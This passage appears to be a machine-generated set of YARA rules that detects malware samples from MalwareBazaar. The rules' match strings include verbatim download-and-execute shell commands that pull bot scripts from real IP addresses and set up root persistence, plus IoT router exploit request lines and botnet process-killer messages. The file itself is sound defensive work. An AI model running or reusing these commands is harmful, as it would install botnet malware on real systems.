        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 98KB and
        all of them
}

rule Windows_5e2e2b3309ec8c4305d437cd8d545841e15679f664c62f8c1be1fe8733d5d292
{
    meta:
        description = "Auto ML: 5e2e2b3309ec8c4305d437cd8d545841e15679f664c62f8c1be1fe8733d5d292"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ReadInt32"
        $s5 = "WindowsFormsApplication16"
        $s6 = "<Module>"
        $s7 = "System.IO"
        $s8 = "get_Data"
        $s9 = "GetData"
        $s10 = "get_Magenta"
        $s11 = "get_nVwc"
        $s12 = "Form1_Load"
        $s13 = "add_Load"
        $s14 = "set_Enabled"
        $s15 = "set_AutoCompleteSource"
        $s16 = "get_KeyCode"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_AutoCompleteMode"
        $s19 = "set_AutoSizeMode"
        $s20 = "set_ColumnHeadersHeightSizeMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 652KB and
        all of them
}

rule Windows_5e351a9f1fb3f62d980bd269a1ab3c652126861bf1d2ec773aa3be89980591a0
{
    meta:
        description = "Auto ML: 5e351a9f1fb3f62d980bd269a1ab3c652126861bf1d2ec773aa3be89980591a0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "0cmD{UszlNI{d3S"
        $s5 = "ReadOnlySpan`1"
        $s6 = "<SetIntAsync>d__6"
        $s7 = "<GetIntAsync>d__7"
        $s8 = "System.IO"
        $s9 = "System.Dynamic"
        $s10 = "System.Collections.Generic"
        $s11 = "ReadToEndAsync"
        $s12 = "get_CanRead"
        $s13 = "Thread"
        $s14 = "Load"
        $s15 = "Unload"
        $s16 = "ReadUnaligned"
        $s17 = "WriteUnaligned"
        $s18 = "get_IsCompleted"
        $s19 = "get_IsFaulted"
        $s20 = "CreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 881KB and
        all of them
}

rule Windows_5e75dd408b7957d0ba77a24386535a86ce21d9642f6792b94b24b4e1539e545a
{
    meta:
        description = "Auto ML: 5e75dd408b7957d0ba77a24386535a86ce21d9642f6792b94b24b4e1539e545a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4011KB and
        all of them
}

rule Windows_5ec29e5f8023d0468f7c3d4b45003402a069c7d5017463d2dfad3fcc0f9eeeff
{
    meta:
        description = "Auto ML: 5ec29e5f8023d0468f7c3d4b45003402a069c7d5017463d2dfad3fcc0f9eeeff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2992KB and
        all of them
}

rule Windows_07b5d39b67400f7b7b3ccee2ecf254cbe564880677f14172a39255d3d5cbf4af
{
    meta:
        description = "Auto ML: 07b5d39b67400f7b7b3ccee2ecf254cbe564880677f14172a39255d3d5cbf4af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Whirtles.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ConnectionProvider"
        $s8 = "ConfigReader"
        $s9 = "FileScanning"
        $s10 = "FileSearcher"
        $s11 = "OpenVPN"
        $s12 = "System.Windows.Forms"
        $s13 = "QueryProcessor"
        $s14 = "QueryCmd"
        $s15 = "DownloadAndExecuteUpdate"
        $s16 = "DownloadUpdate"
        $s17 = "OpenUpdate"
        $s18 = "FileExt"
        $s19 = "UserExt"
        $s20 = "FileUtil"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 166KB and
        all of them
}

rule Linux_5ed740b343a60bf89aa5e2a8d992ff9e3fe28a9c2fab9aefee125d43e32eb732
{
    meta:
        description = "Auto ML: 5ed740b343a60bf89aa5e2a8d992ff9e3fe28a9c2fab9aefee125d43e32eb732"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 196KB and
        all of them
}

rule Android_5f113715e47ddce3f72f9ff69b1aa07ee09225eaf6b501a7b106fa893779a931
{
    meta:
        description = "Auto ML: 5f113715e47ddce3f72f9ff69b1aa07ee09225eaf6b501a7b106fa893779a931"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "res/drawable/ic_settings.xml"
        $s2 = "!!res/drawable/ic_settings_main.xml"
        $s3 = "99Please enable Portal service under Accessibility settings"
        $s4 = "Settings"
        $s5 = "66Allow pop-up windows for the correct application work:"
        $s6 = "==Step 2 - Allow to display pop-up windows from background mode"
        $s7 = "GoogleReader"
        $s8 = "''Check in 'Downloaded Services' list: %s"
        $s9 = "reset"
        $s10 = "open"
        $s11 = "Go to settings"
        $s12 = "RREnable control over your battery usage. Press 'Activate' button in the next window"
        $s13 = "++Protected System component. Can't be viewed"
        $s14 = "!Step 2 - Open"
        $s15 = "\"&Step 3 - Open"
        $s16 = "cksetzen"
        $s17 = "Resetowanie"
        $s18 = "Resetovat"
        $s19 = "okhttp3/internal/publicsuffix/NOTICEM"
        $s20 = "assets/me_module_list"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 4252KB and
        all of them
}

rule Linux_5f2ae374b655ebcbf16907a4833668cd66a659de1c46f2ad64d61bb8e85f5ef8
{
    meta:
        description = "Auto ML: 5f2ae374b655ebcbf16907a4833668cd66a659de1c46f2ad64d61bb8e85f5ef8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 48KB and
        all of them
}

rule Linux_5f4b7496cb2cdd38f3ea976fca429b2e87be82a2115c0b92ce95bd3dcd145ac7
{
    meta:
        description = "Auto ML: 5f4b7496cb2cdd38f3ea976fca429b2e87be82a2115c0b92ce95bd3dcd145ac7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "cmdline"
        $s4 = "/proc/%s/cmdline"
        $s5 = "busybox wget"
        $s6 = "/bin/wget"
        $s7 = "/busybox/wget"
        $s8 = "[locker] killed process: %s ;; pid: %d"
        $s9 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d"
        $s10 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d"
        $s11 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d"
        $s12 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d"
        $s13 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d"
        $s14 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d"
        $s15 = "systemd"
        $s16 = "http"
        $s17 = "(deleted)"
        $s18 = "/proc/self/cmdline"
        $s19 = "No such file or directory"
        $s20 = "No such process"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 166KB and
        all of them
}

rule Linux_5f519e6c250c277cdde396e7ee753278897d869987cbff8ec9a8ec27ada47124
{
    meta:
        description = "Auto ML: 5f519e6c250c277cdde396e7ee753278897d869987cbff8ec9a8ec27ada47124"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 17KB and
        all of them
}

rule Windows_5f7afeeee13aaee6874a59a510b75767156f75d14db0cd4e1725ee619730ccc8
{
    meta:
        description = "Auto ML: 5f7afeeee13aaee6874a59a510b75767156f75d14db0cd4e1725ee619730ccc8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "s:IDS_BROWSETITLE"
        $s9 = "s:IDS_CMDEXTRACTING"
        $s10 = "s:IDS_FILEHEADERBROKEN"
        $s11 = "s:IDS_CANNOTOPEN"
        $s12 = "s:IDS_CANNOTCREATE"
        $s13 = "s:IDS_WRITEERROR"
        $s14 = "s:IDS_READERROR"
        $s15 = "s:IDS_CLOSEERROR"
        $s16 = "s:IDS_CREATEERRORS"
        $s17 = "s:IDS_ALLFILES"
        $s18 = "s:IDS_EXTRFILESTO"
        $s19 = "s:IDS_EXTRFILESTOTEMP"
        $s20 = "s:IDS_WRONGFILEPASSWORD"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1133KB and
        all of them
}

rule Windows_5f9e934fc4a7d1f4e6e7cfccf3f072b9bb56fe83b5c70cf907502b31e9ae5e3c
{
    meta:
        description = "Auto ML: 5f9e934fc4a7d1f4e6e7cfccf3f072b9bb56fe83b5c70cf907502b31e9ae5e3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4766KB and
        all of them
}

rule Linux_5fc3b45e99c70510d9131738ad3bac6f94d624784a84e0307c5b143b4aaf651c
{
    meta:
        description = "Auto ML: 5fc3b45e99c70510d9131738ad3bac6f94d624784a84e0307c5b143b4aaf651c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB and
        all of them
}

rule Linux_5fd7ce92c4663ecab8bee9277547907696ec08490e4326054d0e44c24d45867f
{
    meta:
        description = "Auto ML: 5fd7ce92c4663ecab8bee9277547907696ec08490e4326054d0e44c24d45867f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 103KB and
        all of them
}

rule Windows_5fd81b092504cc4ddefa20f9e1dd5b6ea02db0f4b12381b58224c7ec120c19e4
{
    meta:
        description = "Auto ML: 5fd81b092504cc4ddefa20f9e1dd5b6ea02db0f4b12381b58224c7ec120c19e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "System.IO"
        $s13 = "tJvit3OSTfReAdRaD9t"
        $s14 = "<Module>{133D5916-22F7-4C5F-A164-B9D3396F7EC0}"
        $s15 = "System.Text"
        $s16 = "get_Length"
        $s17 = "get_Chars"
        $s18 = "System.Collections.Generic"
        $s19 = "System.Linq"
        $s20 = "GetEnumerator"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1547KB and
        all of them
}

rule Linux_07d65bb58f848502125920957932cd5769e3f4eda0109f9d3f5c7f7601c04247
{
    meta:
        description = "Auto ML: 07d65bb58f848502125920957932cd5769e3f4eda0109f9d3f5c7f7601c04247"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Linux_5feefcccef3ba30055e4bbe2197d4f5df9c776ca511b9ced59aef76c8adea4bc
{
    meta:
        description = "Auto ML: 5feefcccef3ba30055e4bbe2197d4f5df9c776ca511b9ced59aef76c8adea4bc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ade_1 HTTP/1.1"
        $s2 = "http://schemas."
        $s3 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s4 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Windows_5ff8b5b88ae1cd89f6f3d068f9eff75c50dcfd1f0b46ed0a45bdc3aea2721cdc
{
    meta:
        description = "Auto ML: 5ff8b5b88ae1cd89f6f3d068f9eff75c50dcfd1f0b46ed0a45bdc3aea2721cdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Unable to resolve HTTP prox"
        $s5 = "get_Item1"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "user32"
        $s9 = "ReadInt32"
        $s10 = "get_Item2"
        $s11 = "get_Item3"
        $s12 = "ReadInt64"
        $s13 = "ReadInt16"
        $s14 = "VaultGetItem_WIN7"
        $s15 = "VaultGetItem_WIN8"
        $s16 = "<Module>"
        $s17 = "FileHandleID"
        $s18 = "fileHandleID"
        $s19 = "lpdwProcessID"
        $s20 = "processID"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 242KB and
        all of them
}

rule Linux_60207e9cbf0d178b69789174dbf3e8d0caa0af2a1bc89efa3444ac66bc85cea2
{
    meta:
        description = "Auto ML: 60207e9cbf0d178b69789174dbf3e8d0caa0af2a1bc89efa3444ac66bc85cea2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "shell"
        $s12 = "httpd"
        $s13 = "system"
        $s14 = "wget-log"
        $s15 = "1337SoraLOADER"
        $s16 = "nloads"
        $s17 = "elfLoad"
        $s18 = "/usr/libexec/openssh/sftp-server"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 157KB and
        all of them
}

rule Windows_602575847ec3c1ff6d89ec1f78db941311bcca756de620433038c9d440127f6c
{
    meta:
        description = "Auto ML: 602575847ec3c1ff6d89ec1f78db941311bcca756de620433038c9d440127f6c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2544KB and
        all of them
}

rule Linux_60465cd81a381108fe19dee84619cda10837847f9d4be8a7642dff797cc8754c
{
    meta:
        description = "Auto ML: 60465cd81a381108fe19dee84619cda10837847f9d4be8a7642dff797cc8754c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "zcmDT"
        $s2 = "u-SeTQLb"
        $s3 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 1162KB and
        all of them
}

rule Windows_60a1f8c107a9dbc4b68c7bfa51e81a32307af7a0b02ba946e9632081752002af
{
    meta:
        description = "Auto ML: 60a1f8c107a9dbc4b68c7bfa51e81a32307af7a0b02ba946e9632081752002af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6256KB and
        all of them
}

rule Windows_60bae9c9154ac01436ee1a519b4472fd3c3e73a8449086a2b60691699e03dd3c
{
    meta:
        description = "Auto ML: 60bae9c9154ac01436ee1a519b4472fd3c3e73a8449086a2b60691699e03dd3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Unable to resolve HTTP prox"
        $s5 = "System"
        $s6 = "System.Windows.Forms"
        $s7 = "System.Web.Extensions"
        $s8 = "System.Management"
        $s9 = "System.Xml"
        $s10 = "System.Drawing"
        $s11 = "System.Security"
        $s12 = "System.Core"
        $s13 = "kernel32.dll"
        $s14 = "user32.dll"
        $s15 = "psapi.dll"
        $s16 = "user32"
        $s17 = "kernel32"
        $s18 = "Kernel32.dll"
        $s19 = "vaultcli.dll"
        $s20 = "User32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 898KB and
        all of them
}

rule Linux_60c417b5306cca4a717a34fdb8fca84ea38ac838c28e1426ebf08fa0a38d42aa
{
    meta:
        description = "Auto ML: 60c417b5306cca4a717a34fdb8fca84ea38ac838c28e1426ebf08fa0a38d42aa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "/cmdline"
        $s3 = "/wget"
        $s4 = "/bin/bash -c \"/bin/wget http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh; /bin/curl -k -L --output bins.sh http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh\""
        $s5 = "After=network.target"
        $s6 = "User=root"
        $s7 = "WantedBy=multi-user.target"
        $s8 = "/lib/systemd/system/bot.service"
        $s9 = "/bin/systemctl enable bot"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB and
        all of them
}

rule Linux_60c64edbeb676694f8c1e581135736919951c8f48e2ee3f8c95960158879e3e7
{
    meta:
        description = "Auto ML: 60c64edbeb676694f8c1e581135736919951c8f48e2ee3f8c95960158879e3e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cmdline"
        $s2 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d"
        $s3 = "/proc/%s/cmdline"
        $s4 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d"
        $s5 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d"
        $s6 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d"
        $s7 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d"
        $s8 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d"
        $s9 = "systemd"
        $s10 = "http"
        $s11 = "(deleted)"
        $s12 = "/proc/self/cmdline"
        $s13 = "No such file or directory"
        $s14 = "No such process"
        $s15 = "Interrupted system call"
        $s16 = "Bad file descriptor"
        $s17 = "No child processes"
        $s18 = "Resource temporarily unavailable"
        $s19 = "File exists"
        $s20 = "Too many open files in system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 156KB and
        all of them
}

rule Windows_60e44bcabd3bf72c06745779b94215ae112584bef323ccce564e2153c7b046be
{
    meta:
        description = "Auto ML: 60e44bcabd3bf72c06745779b94215ae112584bef323ccce564e2153c7b046be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = ".rsrc"
        $s4 = "sFilename"
        $s5 = "Module1"
        $s6 = "Module2"
        $s7 = "Module3"
        $s8 = "Module5"
        $s9 = "Module7"
        $s10 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB"
        $s11 = "wininet.dll"
        $s12 = "InternetOpenA"
        $s13 = "BCryptCloseAlgorithmProvider"
        $s14 = "InternetOpenUrlA"
        $s15 = "InternetReadFile"
        $s16 = "InternetCloseHandle"
        $s17 = "user32"
        $s18 = "GetInputState"
        $s19 = "BCryptSetProperty"
        $s20 = "BCryptOpenAlgorithmProvider"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 413KB and
        all of them
}

rule Linux_07dc592b34464b73d80f96d5420db973b2129357754b62a92484ae8bdbb6e2c3
{
    meta:
        description = "Auto ML: 07dc592b34464b73d80f96d5420db973b2129357754b62a92484ae8bdbb6e2c3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Linux_60e997ee3f296c56aa3070e53668063717e82113ca49b12a1c390ea267243ad0
{
    meta:
        description = "Auto ML: 60e997ee3f296c56aa3070e53668063717e82113ca49b12a1c390ea267243ad0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "wget"
        $s2 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s3 = "user"
        $s4 = "User"
        $s5 = "shell"
        $s6 = "system"
        $s7 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s8 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s9 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s10 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s11 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s12 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s13 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s14 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s15 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s16 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s17 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s18 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s19 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
